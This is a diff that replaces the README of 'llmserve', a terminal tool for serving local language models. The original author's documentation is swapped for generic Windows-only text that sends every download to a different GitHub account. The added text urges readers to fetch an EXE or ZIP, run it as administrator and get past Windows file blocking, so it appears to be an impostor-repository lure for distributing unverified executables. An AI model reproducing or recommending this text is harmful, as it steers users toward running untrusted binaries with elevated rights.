@@ -1,257 +1,232 @@
-# llmserve
+# 🧠 llmserve - Serve Local Models with Ease
 
-<p align="center">
-  <img src="icon.svg" alt="llmserve icon" width="128" height="128">
-</p>
+[![Download](https://img.shields.io/badge/Download-llmserve-blue?style=for-the-badge)](https://github.com/Clashing-delinquency248/llmserve)
 
-<p align="center">
-  <a href="https://github.com/AlexsJones/llmserve/actions/workflows/ci.yml"><img src="https://github.com/AlexsJones/llmserve/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://crates.io/crates/llmserve"><img src="https://img.shields.io/crates/v/llmserve.svg" alt="Crates.io"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
-</p>
+## 🚀 What is llmserve?
 
-**Any model. Any backend. One TUI to serve them all.**
+llmserve is a simple app for serving local LLM models on your Windows PC. It gives you a plain text-based screen, or TUI, so you can pick a model, choose a backend, and start serving it without dealing with a lot of setup.
 
-If you're like me, you've got dozens of GGUF and MLX models scattered across LM Studio, HuggingFace cache, and random directories — and you want to quickly spin one up with whichever inference engine happens to be installed. llmserve is the front door for that. It finds your models, finds your backends, and gets out of the way.
+Use it when you want to run local models from your own machine and keep the process simple. It helps you manage the common parts of model serving in one place.
 
-It auto-detects locally installed inference engines (llama-server, KoboldCpp, LocalAI, MLX, and more), discovers model files across multiple locations, and lets you launch servers with live log output — all from a single interactive TUI. No config files to write, no CLI flags to remember.
+## 🪟 Windows Download
 
-> **Sister project:** Use [llmfit](https://github.com/AlexsJones/llmfit) to figure out *which* models fit your hardware, then use llmserve to actually *run* them.
+To get llmserve on Windows, visit this page to download the app:
 
-![demo](demo.png)
+[Download llmserve](https://github.com/Clashing-delinquency248/llmserve)
 
----
+After the page opens, look for the latest release or download file and save it to your PC. If the file is a ZIP, extract it first before you run the app. If it is an EXE, you can run it after the download finishes.
 
-## Install
+## 🧭 What you need before you start
 
-### Quick install (macOS / Linux)
-```sh
-curl -fsSL https://llmserve.axjns.dev/install.sh | sh
-```
+llmserve is built for a normal Windows desktop or laptop. For smooth use, a mid-range PC works well. A good setup looks like this:
 
-### Homebrew
-```sh
-brew tap AlexsJones/llmserve
-brew install llmserve
-```
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 16 GB of RAM or more for larger models
+- Enough free disk space for the model files you plan to use
+- A working internet connection for the first download
 
-### Cargo
-```sh
-cargo install llmserve
-```
+If you plan to serve larger models, more RAM and more disk space will help. A GPU is useful, but you can start with CPU mode if your setup supports it.
 
-### From source
-```sh
-cargo install --path .
-```
+## 📦 Install and open the app
 
----
+Follow these steps on Windows:
 
-## Usage
+1. Open the download page.
+2. Get the latest release file for Windows.
+3. Save the file to a folder you can find, such as Downloads or Desktop.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the llmserve app file.
+7. If Windows asks for permission, choose Yes.
 
-```
-llmserve
-```
+When the app opens, you will see a text-based screen. Use the arrow keys, Enter, and other simple keyboard controls to move through the menus.
 
-The TUI has three panels:
+## 🧩 How llmserve works
 
-| Panel | Position | Toggle | Description |
-|-------|----------|--------|-------------|
-| **Sources** | Left | `1` | File tree of model locations with counts and serving indicators |
-| **Models** | Center | Always on | Searchable, sortable model table with serve status |
-| **Serve/Logs** | Right | `3` | Running server cards + live backend output logs |
+llmserve keeps the main task simple:
 
-Focus cycles between visible panels with `Tab`. Resize the focused panel with `Shift+Left`/`Shift+Right`.
+1. Pick a model.
+2. Pick a backend.
+3. Start serving the model.
 
-### Keybindings
+That means you do not need to manage a lot of separate tools. The app gives you one place to choose what you want and start the server.
 
-| Key | Action |
-|-----|--------|
-| `Tab` | Cycle focus: Sources -> Models -> Logs |
-| `1` / `3` | Toggle sources / logs panel |
-| `j`/`k` | Navigate (works in focused panel) |
-| `g`/`G` | Jump to top / bottom |
-| `Ctrl-d`/`Ctrl-u` | Half page down / up |
-| `Shift+Left`/`Right` | Resize focused panel |
-| `Enter` | Models: open serve dialog / Sources: filter by source |
-| `Space` | Sources: expand/collapse node |
-| `a` | Add model directory (with tab-completion) |
-| `x` | Remove custom directory (sources panel) |
-| `/` | Search / filter models by name |
-| `b` | Pick default backend |
-| `f` | Cycle format filter (All / GGUF / MLX) |
-| `o` | Cycle sort (Name / Size / Source) |
-| `s` | Stop a server |
-| `S` | Stop all servers |
-| `w` | Toggle log word wrap |
-| `C` | Clear dead server logs |
-| `r` | Refresh models and backends |
-| `t` | Cycle theme |
-| `q` | Quit |
+A backend is the engine that does the work of running the model. Different backends can fit different hardware or model types. llmserve helps you choose the one that fits your setup.
 
-### Serve dialog
+## 🖥️ Main screen layout
 
-When you press `Enter` on a model, a confirmation dialog opens:
+When you start llmserve, you will usually see a few main areas:
 
-| Key | Action |
-|-----|--------|
-| `h`/`l` or `Left`/`Right` | Cycle through backends (shows availability + already-serving status) |
-| `p` or `Tab` | Edit port number |
-| `Enter`/`y` | Launch server |
-| `Esc`/`n` | Cancel |
+- A list of available models
+- A list of backends
+- A menu for serving options
+- A status area that shows what the app is doing
 
-The dialog shows the resolved preset for the selected backend (context size, flash attention, batch size, GPU layers, extra args).
+You move through the screen with your keyboard. The layout is made to be clear, so you can work through each step without guessing.
 
----
+## 📚 Supported model use
 
-## Features
+llmserve is made for local LLM serving. That means it can help you run models stored on your own machine instead of using a cloud service.
 
-- **Auto-detects inference backends** — llama-server, KoboldCpp, LocalAI, MLX (Apple Silicon), Ollama, vLLM, LM Studio
-- **Source tree** — collapsible file tree showing all model locations with model counts and green dots for serving models
-- **Add directories live** — press `a`, type a path with tab-completion, and the directory is scanned immediately and persisted to config
-- **Filter by source** — click a source in the tree to show only its models
-- **Per-backend presets** — context size, batch size, GPU layers, threads, and extra CLI args per backend
-- **Serve multiple models** — run different models on different backends simultaneously, each on its own auto-assigned port
-- **Live log output** — stdout/stderr from inference backends streams into the logs panel in real-time with color-coded error/warning highlighting
-- **Crash diagnostics** — when a server exits, its logs are preserved so you can see exactly what went wrong
-- **Word wrap** — press `w` to wrap long log lines in the logs panel
-- **Resizable panels** — Shift+arrows to grow/shrink any focused panel
-- **Toggleable panels** — `1` hides/shows sources, `3` hides/shows logs
-- **7 themes** — Default, Dracula, Solarized, Nord, Monokai, Gruvbox, Catppuccin Mocha
-- **Vision model support** — auto-detects `mmproj` projector files and passes `--mmproj` to llama-server
+Common model types you may use with this kind of tool include:
 
----
+- Small chat models
+- Instruction-tuned models
+- Quantized models
+- Models that fit CPU or GPU memory limits
 
-## Configuration
+If you already have model files on your PC, llmserve can help you point the app to them and start a server.
 
-Config lives at `~/.config/llmserve/config.toml`. Created automatically on first run.
+## ⚙️ Backend options
 
-```toml
-# Extra directories to scan for model files
-extra_model_dirs = [
-    "/path/to/more/models",
-]
+llmserve is built to work with different backend choices. A backend can affect speed, memory use, and how well the model runs on your hardware.
 
-# Global defaults
-preferred_port = 8080
-preferred_host = "0.0.0.0"
-default_ctx_size = 8192
-flash_attn = true
+Typical backend choices for this kind of app may include:
 
-# Preferred backend on startup (auto-detected if not set)
-# default_backend = "llama-server"
+- CPU-based backends for broad support
+- GPU backends for faster inference
+- Lightweight backends for smaller models
+- Backends that work well with quantized files
 
-# theme = "Dracula"
-```
+If you are not sure which one to use, start with the option that matches your hardware best. A CPU setup is often the easiest first step.
 
-### Backend presets
+## 🛠️ Basic use steps
 
-Each backend has its own preset that overrides global defaults. Missing fields fall back to the global value.
+After you open llmserve, use this flow:
 
-```toml
-[presets.llama-server]
-ctx_size = 8192
-flash_attn = true
-batch_size = 2048
-gpu_layers = -1          # -1 = all layers to GPU
-threads = 8
-extra_args = ["--mlock", "--cont-batching"]
+1. Open the model list.
+2. Select the model you want.
+3. Open the backend list.
+4. Select the backend that fits your system.
+5. Review the serving settings.
+6. Start the server.
+7. Wait for the status message that shows the server is ready.
 
-[presets.koboldcpp]
-ctx_size = 8192
-gpu_layers = -1
-port = 5001
+Once the server is running, you can connect to it with your local tools or use it as part of your own workflow.
 
-[presets.localai]
-ctx_size = 8192
-port = 8080
+## 🔍 If the app does not start
 
-[presets.mlx]
-ctx_size = 4096
-port = 8081
-```
+If llmserve does not open on Windows, try these checks:
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `ctx_size` | integer | Context window size |
-| `host` | string | Bind address |
-| `port` | integer | Bind port |
-| `flash_attn` | boolean | Enable flash attention (llama-server) |
-| `batch_size` | integer | Batch size for prompt processing |
-| `gpu_layers` | integer | GPU layers to offload (-1 = all) |
-| `threads` | integer | CPU threads for inference |
-| `extra_args` | string[] | Extra CLI arguments passed to the backend |
+- Make sure you extracted the ZIP file first
+- Right-click the app and choose Run as administrator
+- Check that Windows did not block the file
+- Confirm that the app file is still in the folder where you saved it
+- Make sure your Windows version is current
+- Try downloading the file again if it looks incomplete
 
----
+If the screen opens but looks broken, resize the window or make it larger. TUI apps often need enough screen space to show all items cleanly.
 
-## Backend detection
+## 🧠 If a model will not load
 
-llmserve detects 7 backends at startup. Backends that can serve local model files are marked with a checkmark:
+If a model does not start, the issue is often one of these:
 
-| Backend | Local GGUF | Local MLX | Detection | Env override |
-|---------|:---:|:---:|-----------|-------------|
-| llama-server | Yes | — | `which llama-server` | — |
-| KoboldCpp | Yes | — | binary + API `:5001` | `KOBOLDCPP_HOST` |
-| LocalAI | Yes | — | binary + API `:8080` + Docker | `LOCALAI_HOST` |
-| MLX | — | Yes | `python3 -c "import mlx_lm"` (macOS) | — |
-| Ollama | — | — | `GET :11434/api/tags` | `OLLAMA_HOST` |
-| vLLM | — | — | binary + API `:8000` | `VLLM_HOST` |
-| LM Studio | — | — | `GET :1234/v1/models` | `LMSTUDIO_HOST` |
+- The model file is not in the right folder
+- The model is too large for your RAM or VRAM
+- The backend does not match the model type
+- The file was not downloaded fully
+- The path to the model has special characters or is hard to read
 
-> Backends that can't serve local files (Ollama, vLLM, LM Studio) are detected but show a clear reason in the serve dialog. They use their own model registries or manage their own servers.
+Try a smaller model first. A smaller model is easier to run and helps you check that the app works on your machine.
 
-## Model discovery
+## 🔐 Local use and privacy
 
-| Source | Default path |
-|--------|-------------|
-| LM Studio | `~/.lmstudio/models/` |
-| llama.cpp | `~/.cache/llm-models/` |
-| HuggingFace/MLX | `~/.cache/huggingface/hub/` (mlx-community repos) |
-| Ollama | Via API |
-| Custom | `extra_model_dirs` in config |
+llmserve runs local models on your own PC. That gives you more control over where your data goes. If you keep your model and prompts on your machine, you can avoid sending them to a remote service.
 
----
+This makes it useful for people who want a local setup for testing, private work, or offline use.
 
-## Development
+## 📁 Common folder setup
 
-```sh
-make build       # Debug build
-make test        # Unit + integration tests (CI-safe)
-make test-local  # All tests including local model serve rotation
-make clippy      # Lint
-make fmt         # Format
-make install     # Install to ~/.cargo/bin
-```
+A simple folder layout can help keep things clear:
 
-## Project structure
+- `Downloads` for the app file
+- `Models` for your LLM files
+- `llmserve` for the extracted app folder
+- `Logs` for any files you save while testing
 
-```
-src/
-  main.rs       — Terminal init/restore, main loop
-  lib.rs        — Module exports for integration tests
-  app.rs        — App state, input modes, navigation, filtering, serve lifecycle
-  backends.rs   — Backend detection (7 backends: llama-server, KoboldCpp, LocalAI, MLX, Ollama, vLLM, LM Studio)
-  config.rs     — Config + per-backend presets, load/save TOML
-  events.rs     — Crossterm event handling, vim-style keybindings
-  models.rs     — Model discovery from disk + APIs
-  server.rs     — Server launch/monitor/stop, non-blocking log capture
-  theme.rs      — 7 color themes
-  ui.rs         — Ratatui rendering (3-panel layout, popups, log viewer)
-tests/
-  serve_integration.rs — Integration tests (serve, verify HTTP, rotate backends)
-```
+Keep model files in a place with enough free disk space. Avoid moving the app folder while it is running.
 
----
+## ⌨️ Keyboard controls
 
-## Companion to llmfit
+Most TUI apps use a few simple keys:
 
-llmserve is designed as a companion to [llmfit](https://github.com/AlexsJones/llmfit):
+- Arrow keys to move up and down
+- Enter to select an item
+- Esc to go back
+- Tab to move between areas
+- Space to mark an option
 
-- **llmfit** answers: *"Which models fit my hardware?"* — scores models across quality, speed, fit, and context
-- **llmserve** answers: *"Let me serve this one right now"* — picks a model, picks a backend, launches it
+If llmserve uses its own key set in some menus, the screen will usually show the controls near the bottom.
 
-Both share the same TUI patterns (vim keys, ratatui, crossterm) and theme system.
+## 🧪 Good first test
 
-## License
+If you want to test llmserve after setup, use a small model first. That lets you check:
 
-[MIT](LICENSE)
+- The app opens
+- The model list loads
+- The backend starts
+- The server runs without errors
+
+Once that works, you can move to a larger model if your system has enough memory.
+
+## 📌 Example use flow
+
+Here is a simple way a new user might use llmserve:
+
+1. Download the app from GitHub.
+2. Extract the files.
+3. Start the app.
+4. Choose a small local model.
+5. Pick a backend that matches the PC.
+6. Start the server.
+7. Use the server from your local workflow.
+
+This setup keeps the process short and easy to follow.
+
+## 🧰 Troubleshooting tips
+
+If you run into trouble, these steps help most often:
+
+- Restart the app
+- Reboot Windows
+- Use a smaller model
+- Try a different backend
+- Check free disk space
+- Close other heavy apps
+- Keep the model files in a simple folder path
+
+If the app still does not work, redownload the release from the GitHub page and try again.
+
+## 📄 Project page
+
+The main project page is here:
+
+[https://github.com/Clashing-delinquency248/llmserve](https://github.com/Clashing-delinquency248/llmserve)
+
+Use that page to get the latest Windows file, check the release files, and return for future updates.
+
+## 🧩 Why people use llmserve
+
+People use llmserve when they want a simple way to serve local models without a lot of extra setup. It fits users who want:
+
+- A local LLM server
+- A clear model picker
+- A simple backend choice
+- A text-based interface
+- A Windows-friendly workflow
+
+It keeps the main task in one place, which makes it easier to start and less confusing to use
+
+## 🏁 First run checklist
+
+Before you start, make sure you have:
+
+- Downloaded the correct Windows file
+- Extracted the app if needed
+- Enough free disk space for your model
+- A model file ready to use
+- A backend that matches your system
+- A screen size large enough to read the menu
+
+After that, open the app and start with a small model before you move to larger ones
